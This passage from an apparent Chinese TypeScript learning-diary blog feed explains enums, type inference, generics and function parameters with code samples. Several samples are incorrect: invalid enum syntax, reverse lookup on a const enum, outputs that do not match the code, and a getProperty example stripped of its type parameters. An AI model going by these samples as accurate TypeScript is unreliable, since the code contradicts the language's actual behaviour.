    <content type="html"><![CDATA[<p>本文介绍枚举(<code>enum</code>)及类型推论。<br><a id="more"></a></p><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>使用枚举我们可以定义一些有名字的数字常量。 枚举通过 enum关键字来定义。<br><code>typescript</code> 中的枚举可以理解为是 <code>javascript</code> 中的一种特殊的对象——<strong>键为变量名，值为连续的序数</strong>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">const</span> enumOfJS = &#123;</span><br><span class="line">    one: <span class="number">0</span>,</span><br><span class="line">    two: <span class="number">1</span>,</span><br><span class="line">    three: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(enumOfJS.one); <span class="comment">// -&gt; 0</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfJS.two); <span class="comment">// -&gt; 1</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfJS.three); <span class="comment">// -&gt; 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// typescript</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> enumOfTS = &#123;</span><br><span class="line">    one,</span><br><span class="line">    two,</span><br><span class="line">    three</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS.one); <span class="comment">// -&gt; 0</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS.two); <span class="comment">// -&gt; 1</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS.three); <span class="comment">// -&gt; 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反向枚举</span></span><br><span class="line"><span class="comment">// 在 javascript 并没有这种功能，需要自己遍历</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS[<span class="number">0</span>]); <span class="comment">// -&gt; one</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS[<span class="number">1</span>]); <span class="comment">// -&gt; two</span></span><br><span class="line"><span class="built_in">console</span>.log(enumOfTS[<span class="number">2</span>]); <span class="comment">// -&gt; three</span></span><br></pre></td></tr></table></figure><p><strong>枚举成员</strong></p><p>枚举成员具有一个数字值，它可以是 <code>常数</code> 或是 <code>计算得出的值</code>;<br>当满足如下条件时，枚举成员被当作是常数：</p><ul><li>不具有初始化函数并且之前的枚举成员是常数。 在这种情况下，当前枚举成员的值为上一个枚举成员的值加1。 但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 <code>0</code>。</li><li>枚举成员使用常数枚举表达式初始化。 常数枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：<ul><li>数字字面量。</li><li>引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的） 如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用。</li><li>带括号的常数枚举表达式。</li><li><code>+</code>, <code>-</code>, <code>~</code> 一元运算符应用于常数枚举表达式。</li><li><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>&amp;</code>, <code>|</code>, <code>^</code>二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 <code>NaN</code> 或 <code>Infinity</code>，则会在编译阶段报错。</li></ul></li></ul><p>除此之外所有其它的情况，枚举成员都是被当作需要计算得出的值。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> FileAccess &#123;</span><br><span class="line">    <span class="comment">// constant members</span></span><br><span class="line">    None,</span><br><span class="line">    Read    = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,</span><br><span class="line">    Write   = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,</span><br><span class="line">    ReadWrite  = Read | Write,</span><br><span class="line">    <span class="comment">// computed member</span></span><br><span class="line">    G = <span class="string">"123"</span>.length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>序列化成员</strong></p><p>枚举成员的数值值，默认为从 <code>0</code> 开始的一组序数。改变其中的一个，会影响 <code>之后</code> 的数值序数，而不会对前面的造成影响。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认情况</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> Order &#123;</span><br><span class="line">    A,</span><br><span class="line">    B,</span><br><span class="line">    C,</span><br><span class="line">    D</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> orders = [Order.A, Order.B, Order.C, Order.D]; <span class="comment">// -&gt; [0,1,2,3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 更改数值</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> Order1 &#123;</span><br><span class="line">    A,</span><br><span class="line">    B = <span class="number">3</span>,</span><br><span class="line">    C,</span><br><span class="line">    D</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> orders1 = [Order.A, Order.B, Order.C, Order.D]; <span class="comment">// -&gt; [0,3,4,5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 更改数值为负</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> Order2 &#123;</span><br><span class="line">    A,</span><br><span class="line">    B = <span class="number">-2</span>,</span><br><span class="line">    C,</span><br><span class="line">    D</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class="comment">// -&gt; [0,-2,-1,0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无序数差值</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> Order3 &#123;</span><br><span class="line">    A,</span><br><span class="line">    B = <span class="number">1</span>,</span><br><span class="line">    C,</span><br><span class="line">    D = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class="comment">// -&gt; [0,1,2,2]</span></span><br></pre></td></tr></table></figure><h3 id="类型推论"><a href="#类型推论" class="headerlink" title="类型推论"></a>类型推论</h3><p><code>TypeScript</code> 里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// num 虽然没有指定为 number 类型，但是 typescript 会自动推断 num 的类型为 number</span></span><br><span class="line"><span class="comment">// let num: number = 1;</span></span><br></pre></td></tr></table></figure><h4 id="最佳通用类型"><a href="#最佳通用类型" class="headerlink" title="最佳通用类型"></a>最佳通用类型</h4><p>当要从几个表达式中推断类型时，<code>typescript</code> 会为我们推断出一个最合适的通用类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'4'</span>,<span class="literal">null</span>,<span class="literal">undefined</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还记得吗，null 和 undefined 是所有类型的 子类型</span></span><br><span class="line"><span class="comment">// arr 数组中含有 number 和 string 两种类型，则使用联合类型数组</span></span><br><span class="line"><span class="comment">// let arr: (number|string)[] = [1,2,3,'4',null,undefined]</span></span><br></pre></td></tr></table></figure><h4 id="上下文类型"><a href="#上下文类型" class="headerlink" title="上下文类型"></a>上下文类型</h4><p><code>TypeScript</code> 类型推论也可能按照相反的方向进行，这被叫做“按上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。</p><p>这里直接引用官方例子：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params">mouseEvent</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(mouseEvent.button);  <span class="comment">//-&gt; Error</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// TypeScript 类型检查器使用 Window.onmousedown函数 的类型来 推断 右边函数表达式的参数类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过手动指定的方式，避免类型推断</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onmousedown = <span class="function"><span class="keyword">function</span> (<span class="params">mouseEvent: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(mouseEvent.button); <span class="comment">// -&gt; success</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍枚举(&lt;code&gt;enum&lt;/code&gt;)及类型推论。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(五)</title>
    <link href="https://github.com/TheNightElf/2017/01/30/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/01/30/Typescript学习日记（五）/</id>
    <published>2017-01-30T08:40:56.000Z</published>
    <updated>2018-01-23T09:39:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 <code>以自己的数据类型</code> 来使用组件。<br><a id="more"></a></p><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>这里直接使用 <code>typescript</code> 官方的例子<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入 arg: number 返回 arg: number</span></span><br><span class="line"><span class="comment">// 但是这只能处理 arg: number 这么一种情况</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>重载</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用重载来约束函数又会显得比较啰嗦</span></span><br><span class="line"><span class="comment">// 不写完又无法全面的进行类型检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg: <span class="built_in">string</span></span>): <span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg: <span class="built_in">number</span></span>): <span class="title">number</span></span>;</span><br><span class="line"><span class="comment">// 其它类型...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>(<span class="params">arg</span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>泛型写法</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这句话的意思</span></span><br><span class="line"><span class="comment">// 声明 identity 函数并添加一个 类型变量 T</span></span><br><span class="line"><span class="comment">// 告诉它我传入了一个 参数类型 为 T 的参数</span></span><br><span class="line"><span class="comment">// 你不需要管我这个 T 传递的是什么类型</span></span><br><span class="line"><span class="comment">// 只要帮我检查返回值的类型也是 T 就行了</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方式</span></span><br><span class="line"><span class="comment">// 1. 传入 T 的类型</span></span><br><span class="line"><span class="keyword">let</span> output = identity&lt;<span class="built_in">string</span>&gt;(<span class="string">'str'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 直接调用，借助类型推断来判断 T 的类型</span></span><br><span class="line"><span class="keyword">let</span> output = identity(<span class="string">'str'</span>);</span><br></pre></td></tr></table></figure><p>这就是典型的泛型函数，不同于 <code>any</code> 它不会丢失类型信息。<br>但是在使用泛型变量的时候，我们必须要注意的是泛型变量 <code>T</code> 指的是所有类型。必须确定它能访问的函数和属性，否则会报错。<br>对于添加变量类型被命名为 <code>T</code> 是一种成俗的约定；当然我们也可以定义成别的，只要前后能够统一就行。</p><h4 id="泛型类型"><a href="#泛型类型" class="headerlink" title="泛型类型"></a>泛型类型</h4><p><strong>泛型接口</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> TI &#123;</span><br><span class="line">    &lt;T&gt;(arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output: TI = identity;</span><br></pre></td></tr></table></figure><p>我们还可以将泛型变量 <code>T</code> 放在 <code>interface</code> 上，从而省略内部的泛型变量 <code>T</code>;<br>官方对这一段内容写了一大篇，我没感觉出有多大用处。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> TI&lt;T&gt; &#123;</span><br><span class="line">    (arg: T): T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> output: TI&lt;<span class="built_in">number</span>&gt; = identity;</span><br></pre></td></tr></table></figure><p><strong>泛型约束的继承使用</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> L &#123;</span><br><span class="line">    length: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泛型变量 T 继承自接口 L</span></span><br><span class="line"><span class="comment">// 泛型变量 T 必定含有一个 length 属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">identity</span>&lt;<span class="title">T</span> <span class="title">extends</span> <span class="title">L</span>&gt;(<span class="params">arg: T</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arg.length)</span><br><span class="line">    <span class="keyword">return</span> arg.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">identity(<span class="number">3</span>); <span class="comment">// -&gt; error，现在泛型函数 identity 的参数被 L 约束</span></span><br><span class="line"></span><br><span class="line">identity(&#123;value: <span class="number">3</span>, length: <span class="number">1</span>&#125;) <span class="comment">// -&gt; success</span></span><br></pre></td></tr></table></figure><p><strong>在泛型约束中使用类型参数</strong><br>这里直接引用官方的例子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getProperty</span>(<span class="params">obj: T, key: K</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = &#123; a: <span class="number">1</span>, b: <span class="number">2</span>, c: <span class="number">3</span>, d: <span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line">getProperty(x, <span class="string">"a"</span>); <span class="comment">// -&gt; success</span></span><br><span class="line">getProperty(x, <span class="string">"m"</span>); <span class="comment">// -&gt; error，x 里面没有 'm' 这个 key</span></span><br></pre></td></tr></table></figure><p><strong>在泛型里使用类类型</strong><br>这里直接引用官方的例子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> BeeKeeper &#123;</span><br><span class="line">    hasMask: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> ZooKeeper &#123;</span><br><span class="line">    nametag: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Animal &#123;</span><br><span class="line">    numLegs: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Bee <span class="keyword">extends</span> Animal &#123;</span><br><span class="line">    keeper: BeeKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Lion <span class="keyword">extends</span> Animal &#123;</span><br><span class="line">    keeper: ZooKeeper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// createInstance </span></span><br><span class="line"><span class="comment">// 参数: c: new () =&gt; A 指 参数c 为一个 可以实例化的构造函数</span></span><br><span class="line"><span class="comment">// 且实例化之后的函数类型被 变量类型 A</span></span><br><span class="line">function createInstance&lt;A extends Animal&gt;(c: new () =&gt; A): A &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">createInstance(Lion).keeper.nametag;</span><br><span class="line">createInstance(Bee).keeper.hasMask;</span><br></pre></td></tr></table></figure><h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Demo&lt;T&gt; &#123;</span><br><span class="line">    prop: T;</span><br><span class="line">    add: <span class="function">(<span class="params">x: T, y: T</span>) =&gt;</span> T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> d = <span class="keyword">new</span> Demo&lt;<span class="built_in">number</span>&gt;();</span><br><span class="line">d.prop = <span class="number">10</span>;</span><br><span class="line">d.add = <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还是老样子</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据，这样就可以 &lt;code&gt;以自己的数据类型&lt;/code&gt; 来使用组件。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(四)</title>
    <link href="https://github.com/TheNightElf/2017/01/27/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/01/27/Typescript学习日记（四）/</id>
    <published>2017-01-27T03:58:26.000Z</published>
    <updated>2018-01-23T09:39:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文将会介绍 <code>typescript</code> 中函数的相关内容。<br><a id="more"></a></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><p>此处略过。</p><h4 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h4><p>在函数定义的时候我们可以为函数指定 <code>参数类型</code> 与 <code>返回类型</code>。</p> <figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>) :<span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这种写法是 <code>typescript</code> 中最常见的函数类型写法，不过这是一种 <code>简写写法</code>。</p><p><strong>完整写法：</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> add: </span><br><span class="line">    <span class="comment">//       这是 参数类型 部分         =              这是 返回值类型 部分</span></span><br><span class="line">    (x: <span class="built_in">number</span>, y: <span class="built_in">number</span>) =&gt; <span class="built_in">number</span> = <span class="function"><span class="keyword">function</span> (<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123; <span class="keyword">return</span> x + y &#125;</span><br><span class="line">    <span class="comment">// (baseValue: number, increase: number) =&gt; number = function (x: number, y: number): number &#123; return x + y &#125;</span></span><br></pre></td></tr></table></figure><p>有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 <code>简写写法</code>，<code>typescript</code> 会自动帮我们转化。</p><p><strong>类型推导</strong><br>非常简单，不再叙述，<a href="https://www.tslang.cn/docs/handbook/functions.html" target="_blank" rel="noopener">详见这里</a>。</p><h4 id="可选参数与默认参数"><a href="#可选参数与默认参数" class="headerlink" title="可选参数与默认参数"></a>可选参数与默认参数</h4><p>看过前面 <code>interface</code> 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 <code>es6</code> 函数语法的应该已经非常熟悉了。</p><p><strong>可选参数</strong><br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yourName</span>(<span class="params">firstName: <span class="built_in">string</span>, lastName?: <span class="built_in">string</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lastName) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;firstName&#125;</span> <span class="subst">$&#123;firstName&#125;</span>`</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> firstName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yourName(); <span class="comment">// -&gt; error，最少传入一个参数</span></span><br><span class="line">yourName(<span class="string">'Carl'</span>); <span class="comment">// -&gt; success, 'Carl'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>); <span class="comment">// success, 'Mr. Carl'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>, <span class="string">'Jhon'</span>); <span class="comment">// error, 参数太多</span></span><br></pre></td></tr></table></figure></p><p><strong>默认参数</strong><br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要注意的是 参数位置 不能更改</span></span><br><span class="line">function yourName(firstName: string, lastName = 'Jhon'): string &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;firstName&#125;</span> <span class="subst">$&#123;firstName&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yourName(); <span class="comment">// -&gt; error，最少传入一个参数</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>); <span class="comment">// -&gt; success， 'Mr. Jhon'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="literal">undefined</span>); <span class="comment">// -&gt; success， 'Mr. Jhon'</span></span><br><span class="line">yourName(<span class="string">'Mr.'</span>, <span class="string">'Carl'</span>); <span class="comment">// -&gt; success， 'Mr. Carl'</span></span><br></pre></td></tr></table></figure></p><h4 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h4><p>剩余参数使用的是 <code>es6</code> 的 <code>rest剩余参数</code> 语法(没有使用过的人可以点击<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters" target="_blank" rel="noopener">这里</a>查看)。<code>typescript</code> 中的 <code>剩余参数</code> 的使用方式和 <code>es6</code> 中完全一致。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 